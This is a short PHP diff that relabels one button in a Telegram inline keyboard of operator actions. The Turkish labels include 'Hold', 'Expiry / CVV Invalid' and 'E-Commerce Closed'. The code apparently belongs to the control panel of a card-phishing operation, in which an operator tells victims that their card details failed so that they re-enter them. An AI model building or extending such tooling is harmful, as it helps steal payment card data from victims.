@@ -226,7 +226,7 @@ function tg_inline_klavye(int $log_id): array {
             ['text' => '⏳ Beklet',          'callback_data' => "aksiyon:{$bid}:bekle"],
         ],
         [
-            ['text' => '💳 Kart Hatalı',    'callback_data' => "aksiyon:{$bid}:kart_hatali"],
+            ['text' => '💳 Skt / Cvv Hatalı', 'callback_data' => "aksiyon:{$bid}:kart_hatali"],
             ['text' => '🚫 E-Ticaret Kapalı','callback_data' => "aksiyon:{$bid}:eticaret_kapali"],
         ],
         [
